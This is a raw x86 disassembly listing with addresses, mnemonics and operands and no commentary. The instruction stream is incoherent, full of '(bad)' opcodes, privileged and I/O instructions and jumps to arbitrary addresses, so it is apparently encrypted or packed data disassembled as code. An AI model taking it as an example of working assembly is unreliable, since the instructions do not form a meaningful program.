  41d32a:	fst    QWORD PTR [ebx-0x3b]
  41d32d:	xchg   esp,eax
  41d32e:	jbe    0x41d2c5
  41d330:	dec    esp
  41d331:	xchg   esp,eax
  41d332:	mov    WORD PTR [eax-0x22],?
  41d335:	xchg   esi,eax
  41d336:	mov    ah,0xbe
  41d338:	cmc    
  41d339:	adc    BYTE PTR [ebx+0x426a403e],cl
  41d33f:	or     al,BYTE PTR [eax-0xf]
  41d342:	test   bh,bl
  41d344:	(bad)  
  41d346:	call   0x39b7:0xa867607a
  41d34d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d34e:	add    eax,0x800404b2
  41d353:	fxam   
  41d355:	lods   eax,DWORD PTR ds:[esi]
  41d356:	xor    DWORD PTR [esi],eax
  41d358:	jle    0x41d39d
  41d35a:	pop    edi
  41d35b:	repz mov ?,WORD PTR [ebp+0x3f3df63b]
  41d362:	or     al,0x13
  41d364:	add    DWORD PTR [ebx-0x42b053d],ebx
  41d36a:	push   0xded54846
  41d36f:	xor    esp,DWORD PTR [ecx-0x19]
  41d372:	sbb    ebp,DWORD PTR [ebx]
  41d374:	sub    BYTE PTR [esi-0x272eb0b5],dh
  41d37a:	xchg   esi,eax
  41d37b:	push   ds
  41d37c:	push   ds
  41d37d:	pop    ebp
  41d37e:	scas   eax,DWORD PTR es:[edi]
  41d37f:	nop
  41d380:	and    DWORD PTR [eax+ecx*1+0x6b03bba7],esp
  41d387:	leave  
  41d388:	mov    ah,0x2f
  41d38a:	mov    dl,0x56
  41d38c:	mov    eax,0x7bf6770d
  41d391:	pushf  
  41d392:	dec    esp
  41d393:	sbb    al,BYTE PTR [eax-0x259a7a16]
  41d399:	out    0xee,al
  41d39b:	and    eax,0xd7c9ca5e
  41d3a0:	sbb    DWORD PTR [ebx-0x49b30736],ecx
  41d3a6:	das    
  41d3a7:	cmp    ebp,esp
  41d3a9:	shr    DWORD PTR [ebp-0x6f6dafaa],0x24
  41d3b0:	retf   
  41d3b1:	xor    eax,0xf5b9ec7c
  41d3b6:	fild   WORD PTR [ecx-0x312a5aa0]
  41d3bc:	jle    0x41d42f
  41d3be:	mov    WORD PTR [eax+0x40],ds
  41d3c1:	mov    ah,0xe9
  41d3c3:	mov    cl,0xcf
  41d3c5:	cmp    eax,0x4ef0e335
  41d3ca:	idiv   DWORD PTR [esi+0x3d1e15d7]
  41d3d0:	mov    bl,0xcf
  41d3d2:	addr16 mov ebx,0xf17bfde6
  41d3d8:	(bad)  
  41d3d9:	call   0x3943d302
  41d3de:	imul   DWORD PTR [ebp-0xc]
  41d3e1:	and    al,0x3c
  41d3e3:	(bad)  
  41d3e4:	repz aam 0xab
  41d3e7:	or     al,0xa5
  41d3e9:	cmp    eax,0x64a79dc6
  41d3ee:	test   DWORD PTR [edx],ecx
  41d3f0:	mov    dh,0x13
  41d3f2:	mov    ebx,0xf0647a61
  41d3f7:	push   ds
  41d3f8:	mov    dh,al
  41d3fa:	mov    bl,0x70
  41d3fc:	in     al,0xc
  41d3fe:	fxch   st(1)
  41d400:	cdq    
  41d401:	dec    BYTE PTR [edx]
  41d403:	rcr    ecx,0xc7
  41d406:	dec    eax
  41d407:	mov    ecx,0x2426a96c
  41d40c:	outs   dx,DWORD PTR ds:[esi]
  41d40d:	jo     0x41d41b
  41d40f:	add    ch,BYTE PTR [ecx-0x7e]
  41d412:	fwait
  41d413:	or     bh,ah
  41d415:	ror    BYTE PTR [ecx+ebx*4+0x46],1
  41d419:	imul   esi,edx,0xffffffa8
  41d41c:	add    eax,0x7d8c4411
  41d421:	(bad)  
  41d423:	cs sub eax,0x67ae441
  41d429:	shl    DWORD PTR [edi+0x5c],1
  41d42c:	test   DWORD PTR [ecx-0x3],edx
  41d42f:	into   
  41d430:	sqrtps xmm0,XMMWORD PTR [ecx]
  41d433:	dec    ebx
  41d434:	stc    
  41d435:	retf   0x98b7
  41d438:	arpl   WORD PTR [eax+0xed7b564],dx
  41d43e:	retf   
  41d43f:	and    ebp,esp
  41d441:	jge    0x41d4a4
  41d443:	retf   0xbfd2
  41d446:	(bad)  
  41d448:	jnp    0x41d469
  41d44a:	mov    edx,esi
  41d44c:	dec    esp
  41d44d:	sbb    DWORD PTR [edi-0x1e],edi
  41d450:	sub    edi,eax
  41d452:	pop    eax
  41d453:	in     eax,dx
  41d454:	out    0x92,al
  41d456:	lahf   
  41d457:	mov    edi,eax
  41d459:	sbb    BYTE PTR [edx+eax*1+0x58],bh
  41d45d:	outs   dx,BYTE PTR ds:[esi]
  41d45e:	pop    ss
  41d45f:	repz call 0x1a6ed45a
  41d465:	pop    eax
  41d466:	jecxz  0x41d3ea
  41d468:	daa    
  41d469:	inc    esi
  41d46a:	or     eax,0x960bea82
  41d46f:	fidivr DWORD PTR [eax+ecx*1+0x26e89799]
  41d476:	jl     0x41d41f
  41d478:	add    DWORD PTR [ecx+0x4d],ecx
  41d47b:	jne    0x41d451
  41d47d:	or     edx,DWORD PTR [eax-0x3f]
  41d480:	out    dx,al
  41d481:	imul   bh
  41d483:	dec    esi
  41d484:	leave  
  41d485:	pushf  
  41d486:	push   cs
  41d487:	call   0xa1524b5d
  41d48c:	jbe    0x41d469
  41d48e:	mov    eax,ds:0x2350fa09
  41d493:	aas    
  41d494:	xor    esi,DWORD PTR [eax]
  41d496:	in     al,dx
  41d497:	pushf  
  41d498:	sbb    BYTE PTR [ecx-0x40],bh
  41d49b:	daa    
  41d49c:	cwde   
  41d49d:	out    dx,eax
  41d49e:	mov    ds,WORD PTR [edx-0x79]
  41d4a1:	ja     0x41d4af
  41d4a3:	(bad)  
  41d4a4:	cld    
  41d4a5:	es push ds
  41d4a7:	sub    al,0x1f
  41d4a9:	mov    DWORD PTR [edx],ecx
  41d4ab:	ror    DWORD PTR [eax+0x32],1
  41d4ae:	js     0x41d4a3
  41d4b0:	jp     0x41d479
  41d4b2:	(bad)  
  41d4b5:	shl    BYTE PTR [ebx-0x226281e],1
  41d4bb:	jmp    0xb18f:0xd90bb5df
  41d4c2:	add    BYTE PTR [ecx],0x5c
  41d4c5:	push   ebp
  41d4c6:	loope  0x41d47b
  41d4c8:	pop    eax
  41d4c9:	mov    ds:0x5fb51306,eax
  41d4ce:	add    DWORD PTR [edx+ecx*4+0x6e1c8da8],esp
  41d4d5:	loope  0x41d4d0
  41d4d7:	pop    ss
  41d4d8:	ja     0x41d4c0
  41d4da:	jmp    0x41d533
  41d4dc:	xor    edi,DWORD PTR [ecx-0x10]
  41d4df:	in     al,0x4d
  41d4e1:	and    edx,ebp
  41d4e3:	les    ebp,FWORD PTR [edx]
  41d4e5:	cmp    eax,0x6acb4e41
  41d4ea:	pop    esi
  41d4eb:	mov    ah,0xae
  41d4ed:	add    al,BYTE PTR [esi+0x3e]
  41d4f0:	or     al,0xc9
  41d4f2:	xor    al,0x2a
  41d4f4:	mov    db5,ebp
  41d4f7:	ror    BYTE PTR [esi],0x84
  41d4fa:	inc    ecx
  41d4fb:	aas    
  41d4fc:	mov    ds:0x632cbc43,al
  41d501:	icebp  
  41d502:	cmp    ebp,eax
  41d504:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d505:	pop    esi
  41d506:	gs jge 0x41d4a5
  41d509:	data16 or al,0x41
  41d50c:	stos   BYTE PTR es:[edi],al
  41d50d:	iret   
  41d50e:	mov    bl,0xf7
  41d510:	(bad)  
  41d511:	push   ebp
  41d512:	add    ch,BYTE PTR [edi-0x77]
  41d515:	jb     0x41d4f1
  41d517:	push   cs
  41d518:	cld    
  41d519:	mov    edx,0x5fe92c21
  41d51e:	and    DWORD PTR [eax],esi
  41d520:	repnz imul esi,DWORD PTR [edx-0x27],0x8351b536
  41d528:	sub    al,0x8e
  41d52a:	and    DWORD PTR [ebp+0x78],edi
  41d52d:	(bad)  
  41d52e:	push   ebx
  41d52f:	add    ebp,DWORD PTR [edi+ebx*1-0x39d66a3]
  41d536:	add    BYTE PTR [ecx],cl
  41d538:	sbb    al,0x3
  41d53a:	jl     0x41d56c
  41d53c:	in     al,0xe6
  41d53e:	and    bl,dl
  41d540:	dec    ebp
  41d541:	xchg   BYTE PTR [edx+0x1b3a9b2],dl
  41d547:	pop    esi
  41d548:	jp     0x41d50f
  41d54a:	cmp    cl,BYTE PTR [ebx]
  41d54c:	pop    es
  41d54d:	lock inc esp
  41d54f:	dec    ebp
  41d550:	adc    BYTE PTR [ebp+0x3d],dh
  41d553:	clc    
  41d554:	pop    edx
  41d555:	lea    ebp,[esi-0xf2911b7]
  41d55b:	sbb    dh,BYTE PTR [eax+esi*1]
  41d55e:	es (bad) 
  41d560:	adc    esp,esp
  41d562:	sub    bh,bl
  41d564:	xchg   ebp,eax
  41d565:	xchg   edx,eax
  41d566:	(bad)  
  41d567:	cld    
  41d568:	(bad)  
  41d569:	pop    esp
  41d56a:	bswap  edi
  41d56c:	jb     0x41d55a
  41d56e:	sbb    BYTE PTR ss:[esi+0x4ac89e75],ah
  41d575:	dec    eax
  41d576:	aas    
  41d577:	jo     0x41d514
  41d579:	pop    esi
  41d57a:	shl    BYTE PTR [edi+esi*2-0x3c786ebc],0x29
  41d582:	jo     0x41d589
  41d584:	cmc    
  41d585:	test   BYTE PTR [edi+ecx*2-0x6d5bac86],dh
  41d58c:	les    ebx,FWORD PTR [ebp-0x6c]
  41d58f:	popf   
  41d590:	mov    ebp,0xb1f0a6c
  41d595:	out    dx,al
  41d596:	fcomp  DWORD PTR [esi+0x4]
  41d599:	ret    
  41d59a:	adc    al,BYTE PTR ds:0xa941d609
  41d5a0:	xchg   esi,eax
  41d5a1:	stos   BYTE PTR es:[edi],al
  41d5a2:	xchg   edx,eax
  41d5a3:	and    al,0x79
  41d5a5:	xchg   ebp,eax
  41d5a6:	sar    ch,cl
  41d5a8:	or     edi,DWORD PTR [edx+0x1e9aa4cb]
  41d5ae:	push   es
  41d5af:	and    al,BYTE PTR [eax+eax*8]
  41d5b2:	add    eax,0x5ae5d2a
  41d5b7:	add    eax,DWORD PTR [eax+esi*4+0x18]
  41d5bb:	inc    esi
  41d5bc:	fdivr  DWORD PTR [esi-0x3f293b5a]
  41d5c2:	and    edx,DWORD PTR [ebx-0xfa282a]
  41d5c8:	sub    al,0x77
  41d5ca:	js     0x41d64a
  41d5cc:	xchg   edx,eax
  41d5cd:	cmp    edx,DWORD PTR [edi+0x4d18b993]
  41d5d3:	push   ebp
  41d5d4:	add    edx,DWORD PTR [edx]
  41d5d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5d7:	in     al,dx
  41d5d8:	mov    esp,0x603dec0f
  41d5dd:	cld    
  41d5de:	shl    BYTE PTR [edi+0x74],1
  41d5e1:	rol    BYTE PTR [esi],cl
  41d5e3:	and    BYTE PTR [ebp-0x61742e66],ch
  41d5e9:	(bad)  
  41d5ea:	sti    
  41d5eb:	test   eax,0xfe1e269c
  41d5f0:	das    
  41d5f1:	xchg   esp,eax
  41d5f2:	ds jno 0x41d606
  41d5f5:	adc    BYTE PTR [esi+esi*2],ch
  41d5f8:	sub    al,0x5
  41d5fa:	in     al,dx
  41d5fb:	cdq    
  41d5fc:	rcl    BYTE PTR [ecx-0x411e74bf],cl
  41d602:	jne    0x41d58c
  41d604:	adc    al,0xc0
  41d606:	loope  0x41d62f
  41d608:	ins    DWORD PTR es:[edi],dx
  41d609:	cmp    al,0x49
  41d60b:	ja     0x41d5cd
  41d60d:	adc    DWORD PTR [eax],esp
  41d60f:	inc    ecx
  41d610:	in     eax,dx
  41d611:	ds push ecx
  41d613:	xor    al,0x89
  41d615:	stos   BYTE PTR es:[edi],al
  41d616:	ja     0x41d5a2
  41d618:	loop   0x41d634
  41d61a:	cmp    dh,BYTE PTR [eax+esi*8]
  41d61d:	stos   DWORD PTR es:[edi],eax
  41d61e:	jmp    0x41d69a
  41d620:	out    dx,al
  41d621:	sub    BYTE PTR [eax+0x4f],0x37
  41d625:	push   0xffffff82
  41d627:	(bad)
  41d62a:	hlt    
  41d62b:	(bad)  
  41d62c:	lock loope 0x41d5b0
  41d62f:	cs pop ebp
  41d631:	jne    0x41d5ec
  41d633:	adc    DWORD PTR [ecx-0x40],esp
  41d636:	lods   al,BYTE PTR ds:[esi]
  41d637:	stos   DWORD PTR es:[edi],eax
  41d638:	in     eax,dx
  41d639:	sub    eax,0x8f2b96b
  41d63e:	out    0x5,al
  41d640:	mov    dl,ch
  41d642:	in     al,0xa8
  41d644:	pcmpeqw mm0,QWORD PTR [ebx]
  41d647:	adc    DWORD PTR [ecx+0x29],0xa1edc080
  41d64e:	mov    dl,0xcc
  41d650:	aad    0x5
  41d652:	inc    ecx
  41d653:	and    esi,DWORD PTR [ebp+0x3c]
  41d656:	div    DWORD PTR [esi-0x3a8605d]
  41d65c:	inc    ecx
  41d65d:	adc    al,0xb1
  41d65f:	xchg   ecx,eax
  41d660:	fstp   TBYTE PTR [edi]
  41d662:	sar    BYTE PTR ds:0xeb7632e8,0xac
  41d669:	mov    edx,0x16063601
  41d66e:	out    0x14,al
  41d670:	icebp  
  41d671:	retf   0xb77d
  41d674:	rdmsr  
  41d676:	fucom  st(0)
  41d678:	call   FWORD PTR [esi+eax*8+0x17]
  41d67c:	aaa    
  41d67d:	arpl   bp,dx
  41d67f:	add    dh,bh
  41d681:	and    dh,BYTE PTR [ebx]
  41d683:	sub    bl,BYTE PTR [eax-0x75bdf80d]
  41d689:	hlt    
  41d68a:	ja     0x41d666
  41d68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d68d:	test   eax,0xb1541a5b
  41d692:	mov    bh,0xaf
  41d694:	xor    DWORD PTR [ebp+0x4d],ecx
  41d697:	cs jae 0x41d6f3
  41d69a:	dec    ebx
  41d69b:	jns    0x41d6ef
  41d69d:	sub    esp,DWORD PTR [edx-0x35]
  41d6a0:	jmp    0xc4b5:0xd04fdbb1
  41d6a7:	or     al,0x84
  41d6a9:	xlat   BYTE PTR ds:[ebx]
  41d6aa:	int    0x2d
  41d6ac:	mov    dl,0xa8
  41d6ae:	pop    ds
  41d6af:	xchg   ebx,eax
  41d6b0:	dec    ebp
  41d6b1:	call   0x4717d98c
  41d6b6:	pop    ebx
  41d6b7:	loop   0x41d6d4
  41d6b9:	hlt    
  41d6ba:	mov    al,BYTE PTR [edi+0x57]
  41d6bd:	ss lock dec edx
  41d6c0:	js     0x41d677
  41d6c2:	es aad 0xee
  41d6c5:	mov    bl,0xa6
  41d6c7:	jg     0x41d726
  41d6c9:	jne    0x41d719
  41d6cb:	pusha  
  41d6cc:	ins    DWORD PTR es:[edi],dx
  41d6cd:	ret    0x4604
  41d6d0:	sahf   
  41d6d1:	icebp  
  41d6d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6d3:	dec    edi
  41d6d4:	mov    al,ds:0xa88887a6
  41d6d9:	test   al,0x16
  41d6db:	leave  
  41d6dc:	and    edx,DWORD PTR [edx-0xdc58f53]
  41d6e2:	adc    eax,0x3f21c8e9
  41d6e7:	data16 shr BYTE PTR [edx-0x4a],0xca
  41d6ec:	jecxz  0x41d713
  41d6ee:	ds in  al,0xfe
  41d6f1:	mov    dh,0x98
  41d6f3:	ins    BYTE PTR es:[edi],dx
  41d6f4:	push   cs
  41d6f5:	dec    esi
  41d6f6:	out    dx,al
  41d6f7:	and    DWORD PTR [edi],ebx
  41d6f9:	xor    bh,BYTE PTR [edi]
  41d6fb:	adc    al,cl
  41d6fd:	inc    esp
  41d6fe:	sub    dh,BYTE PTR [edi+0x64]
  41d701:	idiv   ebx
  41d703:	mov    ebp,0xac3dd010
  41d708:	sbb    eax,0x2335af36
  41d70d:	or     eax,0x5b7d50a2
  41d712:	fist   DWORD PTR [ebp+0x700cd0d4]
  41d718:	call   0x500b76ef
  41d71d:	inc    ebp
  41d71e:	inc    edi
  41d71f:	lods   eax,DWORD PTR ds:[esi]
  41d720:	es pop ss
  41d722:	push   esi
  41d723:	add    al,BYTE PTR [eax+0x4d]
  41d726:	sbb    DWORD PTR [eax+0x20cef3ee],eax
  41d72c:	mov    esi,0x17e02852
  41d731:	stc    
  41d732:	ret    0xdaa2
  41d735:	jo     0x41d74d
  41d737:	add    BYTE PTR [esi],bh
  41d739:	pop    ebp
  41d73a:	pop    ss
  41d73b:	inc    esi
  41d73c:	mov    edx,0xafaad4ce
  41d741:	arpl   WORD PTR [edi-0x249c77bf],bx
  41d747:	xchg   BYTE PTR gs:[ebx-0x5d163542],ch
  41d74e:	int3   
  41d74f:	mov    ebx,0x6dc9c12a
  41d754:	jo     0x41d755
  41d756:	mov    ds:0x5e2480b5,eax
  41d75b:	mov    dl,0xf4
  41d75d:	jge    0x41d72d
  41d75f:	shl    BYTE PTR [esi+0x15],1
  41d762:	(bad)  
  41d763:	dec    esp
  41d764:	lock int 0xc8
  41d767:	jp     0x41d728
  41d769:	aam    0xde
  41d76b:	aaa    
  41d76c:	pop    ebp
  41d76d:	push   eax
  41d76e:	imul   DWORD PTR [eax+ebp*4-0x1f13c769]
  41d775:	adc    ecx,DWORD PTR [ebx]
  41d777:	sahf   
  41d778:	in     eax,dx
  41d779:	sbb    eax,0x1a86f5ba
  41d77e:	dec    esi
  41d77f:	add    eax,0x53c0bbc8
  41d784:	inc    eax
  41d785:	push   edx
  41d786:	sbb    ch,BYTE PTR [ebx]
  41d788:	lods   eax,DWORD PTR ds:[esi]
  41d789:	adc    BYTE PTR [eax+0x27],ah
  41d78c:	idiv   DWORD PTR [esi+0x7f]
  41d78f:	dec    ebx
  41d790:	dec    esp
  41d791:	ret    0xf9c4
  41d794:	hlt    
  41d795:	lock popa 
  41d797:	arpl   WORD PTR [ebx-0x5c1fcab7],sp
  41d79d:	es pop edi
  41d79f:	pop    esi
  41d7a0:	pop    ecx
  41d7a1:	test   DWORD PTR [ebp-0x47],esp
  41d7a4:	mov    dh,0xc0
  41d7a6:	mov    ebp,cs
  41d7a8:	ret    
  41d7a9:	mov    ds:0x93bf31b8,al
  41d7ae:	jne    0x41d76b
  41d7b0:	xor    DWORD PTR [ebp+0xa],esi
  41d7b3:	aad    0xef
  41d7b5:	cmp    ebx,DWORD PTR [ecx-0x1561d1cf]
  41d7bb:	sbb    BYTE PTR [ecx+edi*1+0x53],0x79
  41d7c0:	loopne 0x41d7ac
  41d7c2:	mov    dh,BYTE PTR [ecx+eiz*4-0xea370d1]
  41d7c9:	xchg   esi,ebx
  41d7cb:	out    0x3f,al
  41d7cd:	jne    0x41d786
  41d7cf:	out    0x4a,al
  41d7d1:	cmp    ebx,esi
  41d7d3:	xor    eax,0x5f367881
  41d7d8:	mov    ebp,0x83651e45
  41d7dd:	cmp    eax,0x1296c1d6
  41d7e2:	loop   0x41d7c1
  41d7e4:	dec    ecx
  41d7e5:	push   es
  41d7e6:	pop    edi
  41d7e7:	into   
  41d7e8:	in     eax,dx
  41d7e9:	jbe    0x41d778
  41d7eb:	mov    bh,0x43
  41d7ed:	cmp    eax,0xf679154a
  41d7f2:	xchg   esp,eax
  41d7f3:	xor    dh,0x1d
  41d7f6:	jnp    0x41d874
  41d7f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7f9:	pop    eax
  41d7fa:	(bad)  
  41d7fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7fc:	popf   
  41d7fd:	adc    BYTE PTR [ecx-0x61],dh
  41d800:	mov    esi,0x619c29af
  41d805:	or     cl,BYTE PTR fs:[ebx-0x5e]
  41d809:	je     0x41d866
  41d80b:	jge    0x41d86e
  41d80d:	sti    
  41d80e:	pop    es
  41d80f:	mov    al,BYTE PTR [edi+esi*8]
  41d812:	pop    ecx
  41d813:	das    
  41d814:	ror    DWORD PTR [eax+eiz*1],cl
  41d817:	fs mov esp,0x2c1d28fa
  41d81e:	cmp    BYTE PTR [ebx+0x76a6e096],dh
  41d824:	mov    ds:0x651c12f5,eax
  41d829:	sti    
  41d82a:	ret    
  41d82b:	bound  ecx,QWORD PTR [ebp-0x7c9b8938]
  41d831:	jmp    0x9801:0x7f86b546
  41d838:	fisub  DWORD PTR [ebx-0x7d]
  41d83b:	ins    DWORD PTR es:[edi],dx
  41d83c:	push   ecx
  41d83d:	sub    DWORD PTR [eax+ebx*1],esp
  41d840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d841:	ds sbb eax,0x30878b36
  41d847:	lods   eax,DWORD PTR ss:[esi]
  41d849:	cld    
  41d84a:	enter  0x5cb8,0xf4
  41d84e:	xor    DWORD PTR [esi+0xdc082ee],edi
  41d854:	adc    BYTE PTR [ebp-0x57],ch
  41d857:	leave  
  41d858:	xor    BYTE PTR [ebx+eiz*8+0xad73cd8],ch
  41d85f:	fdiv   st,st(6)
  41d861:	rcr    ecx,1
  41d863:	pushf  
  41d864:	(bad)  
  41d865:	sbb    bh,BYTE PTR [ecx-0x1b]
  41d868:	fwait
  41d869:	dec    ebp
  41d86a:	mov    ds:0x1c94a9d7,eax
  41d86f:	pop    edi
  41d871:	popf   
  41d872:	sbb    bh,BYTE PTR [edx-0x66bd146b]
  41d878:	xor    BYTE PTR [edi-0xf],dh
  41d87b:	pusha  
  41d87c:	test   DWORD PTR [eax],esp
  41d87e:	and    al,BYTE PTR [ecx+0xc]
  41d881:	scas   eax,DWORD PTR es:[edi]
  41d882:	mov    edi,DWORD PTR [eax]
  41d884:	cli    
  41d885:	dec    edx
  41d886:	test   DWORD PTR [eax-0x26],0x20483c6c
  41d88d:	repz shl esp,1
  41d890:	neg    DWORD PTR [eax*4-0x2c104451]
  41d897:	ret    
  41d898:	push   esp
  41d899:	cwde   
  41d89a:	cld    
  41d89b:	jl     0x41d850
  41d89d:	in     eax,dx
  41d89e:	aad    0x58
  41d8a0:	aas    
  41d8a1:	int    0xce
  41d8a3:	push   edi
  41d8a4:	add    edi,esp
  41d8a6:	imul   esi,eax,0xffffffe3
  41d8a9:	xor    cl,BYTE PTR [edx+edi*4-0x74]
  41d8ad:	pop    edi
  41d8ae:	push   ds
  41d8af:	xchg   DWORD PTR [ecx],ecx
  41d8b1:	mov    bl,BYTE PTR ds:0xb758dffc
  41d8b7:	pop    ebx
  41d8b8:	in     al,dx
  41d8b9:	sub    DWORD PTR [ecx+0x28],esp
  41d8bc:	in     al,dx
  41d8bd:	inc    esi
  41d8be:	adc    DWORD PTR [eax+0x191bc442],edi
  41d8c4:	aas    
  41d8c5:	dec    esp
  41d8c6:	int3   
  41d8c7:	jo     0x41d881
  41d8c9:	sub    DWORD PTR [esi+0x1d],ecx
  41d8cc:	(bad)  
  41d8cd:	imul   al
  41d8cf:	xor    BYTE PTR [esi],0x79
  41d8d2:	pop    edx
  41d8d3:	jae    0x41d8b6
  41d8d5:	retf   0x4da7
  41d8d8:	jp     0x41d8e5
  41d8da:	inc    ebp
  41d8db:	cmp    BYTE PTR [edx],0x26
  41d8de:	mov    edi,0xe207ae94
  41d8e3:	clc    
  41d8e4:	adc    edx,DWORD PTR [esi-0x4503100b]
  41d8ea:	and    DWORD PTR [eax-0x53],esp
  41d8ed:	cwde   
  41d8ee:	pusha  
  41d8ef:	neg    BYTE PTR [edx+0x5f]
  41d8f2:	test   al,0xf3
  41d8f4:	and    al,0xb4
  41d8f6:	fdiv   QWORD PTR [ebx]
  41d8f8:	mov    ecx,0xcfb571f0
  41d8fd:	sub    eax,0x5dfb87c2
  41d902:	push   edi
  41d903:	imul   esi,DWORD PTR [ebx],0xdb983fa1
  41d909:	xor    eax,0x9de77ab4
  41d90e:	stos   BYTE PTR es:[edi],al
  41d90f:	ret    
  41d910:	push   es
  41d911:	cmp    al,0xec
  41d913:	aaa    
  41d914:	fcomp  DWORD PTR [esi+ebp*1-0x61]
  41d918:	jmp    0x234a:0x15998835
  41d91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d920:	int3   
  41d921:	ds rcl eax,0x38
  41d925:	imul   edx,DWORD PTR [edi-0x69],0x6f
  41d929:	xchg   DWORD PTR [ecx*2+0x2758e522],esp
  41d930:	icebp  
  41d931:	xchg   ecx,eax
  41d932:	jl     0x41d913
  41d934:	mov    ebx,0x5108805
  41d939:	ds es fwait
  41d93c:	push   0xffffffbd
  41d93e:	outs   dx,BYTE PTR ds:[esi]
  41d93f:	(bad)  
  41d940:	sbb    cl,cl
  41d942:	xchg   ecx,eax
  41d943:	or     ecx,ebx
  41d945:	add    al,BYTE PTR [ebx+0x1e]
  41d948:	push   edx
  41d949:	sbb    DWORD PTR [ebp+eiz*1+0x2a5fbb93],0xffffff9f
  41d951:	push   0xb94773be
  41d956:	pop    es
  41d957:	mov    al,ds:0x3a14d0aa
  41d95c:	and    DWORD PTR [eax-0x1b657d86],0xffffffe7
  41d963:	dec    ecx
  41d964:	mov    ss,WORD PTR [edx-0x2d]
  41d967:	(bad)  
  41d968:	xor    bl,al
  41d96a:	dec    esp
  41d96b:	cmp    DWORD PTR [ecx-0x3b],ebx
  41d96e:	pop    edx
  41d96f:	push   esp
  41d970:	sbb    DWORD PTR [edi],esp
  41d972:	mov    DWORD PTR [ebp+0x1b7f5aa],ebp
  41d978:	pop    ebx
  41d979:	es jbe 0x41d9d9
  41d97c:	das    
  41d97d:	and    DWORD PTR [edx],edx
  41d97f:	push   ss
  41d980:	ja     0x41d9c0
  41d982:	jbe    0x41d907
  41d984:	push   0x32
  41d986:	cwde   
  41d987:	fs or  eax,0x6df5fa9b
  41d98d:	aam    0xc
  41d98f:	scas   al,BYTE PTR es:[edi]
  41d990:	adc    ebp,DWORD PTR [edx-0x2309fe95]
  41d996:	pop    eax
  41d997:	mov    al,0x0
  41d999:	in     eax,0xa8
  41d99b:	xchg   DWORD PTR [eax+edi*2],ebx
  41d99e:	call   0xb7af:0x8786f1a9
  41d9a5:	fadd   DWORD PTR [esp+ecx*2-0x2ae0f630]
  41d9ac:	push   0x33
  41d9ae:	in     al,dx
  41d9af:	cmp    al,0x76
  41d9b1:	push   edx
  41d9b2:	cmp    eax,0xb3c4a715
  41d9b7:	dec    edx
  41d9b8:	or     ebx,ebx
  41d9ba:	inc    ecx
  41d9bb:	inc    edx
  41d9bc:	sahf   
  41d9bd:	mov    BYTE PTR [eax+eax*4+0x33f0c948],ch
  41d9c4:	jmp    0xc87a3998
  41d9c9:	repz cwde 
  41d9cb:	xchg   edi,eax
  41d9cc:	mov    ds:0x1899559b,al
  41d9d1:	xor    BYTE PTR [edi-0x2b48804f],0x75
  41d9d8:	jmp    0x9c60:0x76c3c365
  41d9df:	pop    ebp
  41d9e0:	pop    ebx
  41d9e1:	hlt    
  41d9e2:	xchg   edi,eax
  41d9e3:	and    al,0x62
  41d9e5:	nop
  41d9e6:	or     cl,ah
  41d9e8:	push   ebp
  41d9e9:	push   ebx
  41d9ea:	jne    0x41d9ad
  41d9ec:	cld    
  41d9ed:	fcmovbe st,st(7)
  41d9ef:	cmp    eax,DWORD PTR [esi]
  41d9f1:	push   0x73
  41d9f3:	xchg   eax,esi
  41d9f5:	sbb    DWORD PTR [ebx-0xb],ecx
  41d9f8:	mov    cl,ch
  41d9fa:	mov    dl,0x12
  41d9fc:	sub    eax,0x969cc635
  41da01:	rol    BYTE PTR [esi+0x54a58ef7],1
  41da07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da08:	pop    edx
  41da09:	jns    0x41da0e
  41da0b:	sbb    esi,ebx
  41da0d:	inc    ebp
  41da0e:	push   edi
  41da0f:	or     eax,0x30566c90
  41da14:	aad    0x86
  41da16:	cld    
  41da17:	jae    0x41da95
  41da19:	push   cs
  41da1a:	cwde   
  41da1b:	addr16 push ebx
  41da1d:	push   0x14
  41da1f:	std    
  41da20:	mov    esp,0xc463303f
  41da25:	test   eax,0xa011d6ae
  41da2a:	jle    0x41daa3
  41da2c:	shl    BYTE PTR [edi],1
  41da2e:	repz jecxz 0x41da50
  41da31:	mov    BYTE PTR [ecx-0x6b],bh
  41da34:	arpl   WORD PTR [ebx],bp
  41da36:	pusha  
  41da37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da38:	int    0x6
  41da3a:	xor    eax,0xbc4ffbc7
  41da3f:	retf   0x834d
  41da42:	push   esp
  41da43:	int    0x86
  41da45:	test   eax,0xf8d3f1f8
  41da4a:	in     al,dx
  41da4b:	add    edi,ecx
  41da4d:	pop    ss
  41da4e:	int3   
  41da4f:	xchg   esp,eax
  41da50:	popa   
  41da51:	out    dx,al
  41da52:	jp     0x41da88
  41da54:	das    
  41da55:	psadbw mm0,QWORD PTR [ecx]
  41da58:	xor    DWORD PTR [ebx-0x12],edx
  41da5b:	hlt    
  41da5c:	pop    ss
  41da5d:	pop    edi
  41da5e:	or     edx,ecx
  41da60:	rcl    BYTE PTR [eax+0x43],0x33
  41da64:	xor    esp,esp
  41da66:	daa    
  41da67:	(bad)  
  41da68:	into   
  41da69:	xor    BYTE PTR [edx+0x5d2d0ba9],bl
  41da6f:	ss jmp 0xb9b3e564
  41da75:	out    dx,al
  41da76:	scas   al,BYTE PTR es:[edi]
  41da77:	aaa    
  41da78:	loopne 0x41da23
  41da7a:	push   ss
  41da7b:	mov    ecx,0x5739aa0c
  41da81:	pop    edi
  41da82:	retf   
  41da83:	inc    esp
  41da84:	mov    ah,0xa6
  41da86:	scas   eax,DWORD PTR es:[edi]
  41da87:	enter  0x8037,0x19
  41da8b:	dec    eax
  41da8c:	call   0xf10ece0c
  41da91:	(bad)  
  41da92:	lock jl 0x41da17
  41da95:	mov    eax,0x8d1e9f9b
  41da9a:	ss or  eax,0xd587daba
  41daa1:	mov    ecx,0xf2a27ed5
  41daa6:	add    edi,DWORD PTR [edi]
  41daa8:	outs   dx,BYTE PTR ds:[esi]
  41daa9:	into   
  41daaa:	or     BYTE PTR [edx],bh
